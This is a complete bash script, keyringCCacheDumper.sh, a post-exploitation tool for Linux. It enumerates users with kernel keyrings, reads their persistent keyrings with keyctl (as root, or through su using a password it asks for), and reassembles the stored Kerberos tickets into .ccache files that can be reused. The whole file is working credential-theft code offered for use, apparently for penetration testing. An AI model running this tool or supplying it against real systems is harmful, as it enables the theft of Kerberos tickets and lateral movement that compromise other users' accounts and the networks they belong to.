#!/bin/bash
# -*- coding: utf-8 -*-
# File name          : keyringCCacheDumper.sh
# Author             : Aku (@akumarachi)
# Date created       : 13 Dec 2024

# Reset
Color_Off='\033[0m'       # Text Reset

# Regular Colors
Black='\033[0;30m'        # Black
Red='\033[0;31m'          # Red
Green='\033[0;32m'        # Green
Yellow='\033[0;33m'       # Yellow
Blue='\033[0;34m'         # Blue
Purple='\033[0;35m'       # Purple
Cyan='\033[0;36m'         # Cyan
White='\033[0;37m'        # White

#Const
HEADER='0504000c00010008ffffffff00000000'

# Args default values
VERBOSITY=2
USER=""
SELF=0
PASSWORD=""

#banner
banner () {
cat <<\EOF
    __                   _                ____________           __            ____
   / /_____  __  _______(_)___  ____ _   / ____/ ____/___ ______/ /_  ___     / __ \__  ______ ___  ____  ___  _____
  / //_/ _ \/ / / / ___/ / __ \/ __ `/  / /   / /   / __ `/ ___/ __ \/ _ \   / / / / / / / __ `__ \/ __ \/ _ \/ ___/
 / ,< /  __/ /_/ / /  / / / / / /_/ /  / /___/ /___/ /_/ / /__/ / / /  __/  / /_/ / /_/ / / / / / / /_/ /  __/ /   v1.0.0
/_/|_|\___/\__, /_/  /_/_/ /_/\__, /   \____/\____/\__,_/\___/_/ /_/\___/  /_____/\__,_/_/ /_/ /_/ .___/\___/_/     by @akumarachi
          /____/             /____/                                                             /_/

EOF
}

# Logger
logger_debug () {
    if [[ VERBOSITY -ge 3 ]]
    then
      echo -e "${Yellow}[?] $1 ${Color_Off}"
    fi
}
logger_info () {
  if [[ VERBOSITY -ge 2 ]]
  then
    echo -e "${Blue}[*] $1 ${Color_Off}"
  fi
}
logger_success ()  {
  if [[ VERBOSITY -ge 1 ]]
  then
    echo -e "${Green}[+] $1 ${Color_Off}"
  fi
}
logger_error () {
  if [[ VERBOSITY -ge 0 ]]
  then
    echo -e "${Red}[!] $1 ${Color_Off}"
  fi
}

# Helper
help () {
  banner
  echo ""
  echo "keyringCCacheDumper - Dump Kerberos CCache file from keyring by @akumarachi"
  echo ""
  echo "usage: $0 [-v]"
  echo "options:"
  echo "  -h, --help                    show this help message"
  echo "  -u, --user                    Specify a user to target"
  echo "  --self                        Dump self ccache"
  echo "  -v, --verbosity VERBOSITY     set verbosity of this script, value can be 0 (error),
                                                                              1 (success),
                                                                              2 (info),
                                                                              3 (debug)"
}

# Parse Args
while [[ $# -gt 0 ]]; do
  case $1 in
    -v|--verbosity)
      VERBOSITY="$2"
      shift # past argument
      shift # past value
      ;;
    -u|--user)
      USER="$2"
      shift
      shift
      ;;
    -h|--help)
      help
      exit 1
      ;;
    --self)
      SELF=1
      shift
      ;;
    -*|--*)
      logger_error "Unknown option $1"
      help
      exit 1
      ;;
    *)
      shift # past argument
      ;;
  esac
done

run_command () {
  if [[ $# -ne 2 ]]; then
      logger_error "Error calling gen_command function, expected 2 arguments, $# passed"
      return 1
  fi
  command=$1
  user=$2
  current_user=$(id -nu)
  if [[ $SELF -eq 1 || "$curent_user" == "$user" ]]; then
    echo -e "$(eval "$command")"
    return 0
  fi
  if [[ -n "$USER" ]]; then
    res=$(echo "$PASSWORD" | su - $USER -c "$command" 2>/dev/null)
    echo -e "$res"
    return 0
  fi
  res=$(echo "$PASSWORD" | su - $user -c "$command" 2>/dev/null)
  echo -e "$res"
  return 0

}

get_password () {
  if [[ $# -ne 1 ]]; then
    logger_error "Error calling gen_command function, expected 1 arguments, $# passed"
    return 1
  fi
  read -n 1 -p "Did you have password for user $1? [y/N]: " char
  echo ""
  if [[ "$char" != "y" ]]; then
    return 1
  fi
  read -s -p "Give $1 password: " PASSWORD
  echo ""
  logger_info "Try authentication for user $Green$1$Blue with password $Green$PASSWORD$Blue"
  echo "$PASSWORD" | su - "$1" -c "whoami" 2>/dev/null
  if [ $? -eq 0 ]; then
    logger_success "Authentication success"
    return 0
  else
    logger_error "Authentication fail"
    return 1
  fi
}

dump_ticket () {
  if [[ $# -ne 2 ]]; then
    logger_error "Error calling dump_ticket function, expected 2 arguments, $# passed"
    return 1
  fi
  user=$1
  address=$2

  logger_info "Try to dump CCache at address:$Blue $address"
  ccache_keyring=$(run_command "keyctl show $address" "$user")
  logger_debug "$ccache_keyring"
  principal_address=$(echo "$ccache_keyring" | grep "__krb5_princ__" | awk '{print $1}')
  big_key_address=$(echo "$ccache_keyring" | grep "big_key" | grep -v "X-CACHECONF" | awk '{print $1}')
  principal=$(run_command  "keyctl print $principal_address" "$user"| awk -F : '{print $3}')
  logger_debug "$principal"
  big_key=$(run_command "keyctl print $big_key_address" "$user"| awk -F : '{print $3}')
  logger_debug "$big_key"
  if [[ -n $big_key && -n $principal ]]; then
    ticket=$HEADER$principal$big_key
    logger_debug "$ticket"
    random_string=$(head /dev/urandom | tr -dc 'A-Za-z0-9' | head -c 5)
    echo "$ticket" | xxd -r -p >> krb_$user-$random_string.ccache
    logger_success "CCache successfuly dump, writing to file :$Purple krb_$user-$random_string.ccache"
    return 0
  fi
}

get_keyring () {
  if [[ $# -ne 1 ]]; then
      logger_error "Error calling dump_keyring function, expected 1 arguments, $# passed"
      return 1
  fi
  logger_info "Try to get keyring of user: ${Green}${user}"
  keyctl_get_persistent=$(run_command "keyctl get_persistent @u" "$user")
  logger_debug "${keyctl_get_persistent}"

  if [[ $keyctl_get_persistent =~ ^[0-9]+$ ]]
  then
      logger_info "Persistent keyring found: ${Green}${keyctl_get_persistent}"
      keyctl_show=$(run_command "keyctl show" "$user")
      logger_debug "$keyctl_show"

      if [[ $keyctl_show == *"krb_ccache"* ]]; then
        ccache_keyring_addresses=$(echo "$keyctl_show" | grep "krb_ccache" -A1 | tail -n +2 | awk '{print $1}')
        logger_debug "$ccache_keyring_addresses"
      fi
  else
      logger_error "No Persistent keyring found for the user $user"
  fi
}

dump_keyring () {
  if [[ $# -ne 1 ]]; then
      logger_error "Error calling dump_keyring function, expected 1 arguments, $# passed"
      return
  fi
  user=$(id -nu $1 2>&1)
  if [ $? -eq 0 ]; then
    euid=$(id -u)
    if [[ $euid -ne 0 && $euid -ne $1 ]]; then
      get_password "$user"
      if [ $? -ne 0 ]; then
          return
      fi
    fi
    get_keyring "$user"
    for address in $ccache_keyring_addresses;
    do
      logger_success "Found CCache in user $Blue$user$Green keyring at address $Blue$address"
      dump_ticket "$user" "$address";
    done
  else
      logger_error "id '$1': no such user"
  fi
}

root_check () {
    uid=$(id -u)
    if [[ $uid -ne 0 ]]; then
      logger_error "This script is better running as root!"
      read -n 1 -p "Continue? [y/N]: " char
      echo ""
      if [[ "$char" != "y" ]]; then
              echo "Bye Bye! "
              exit 1
      fi
      return 1
    fi
    return 0
}

# Code
__main () {
  banner

  if [[ $SELF -eq 1 ]]; then
      uid=$(id -u)
      dump_keyring "$uid"
  elif [[ -n "$USER" ]]; then
      root_check
      uid=$(id $USER -u)
      if [ $? -eq 0 ]; then
        dump_keyring "$uid"
      fi
  else
      root_check
      uids=$(awk '{print$1}' /proc/key-users | tr -d :)
      logger_info "found uid : ${Green}$(echo -e $uids | tr '\r' ' ')"
      for uid in $uids;
      do
        dump_keyring "$uid"
      done;
      return 0
  fi

}

__main $*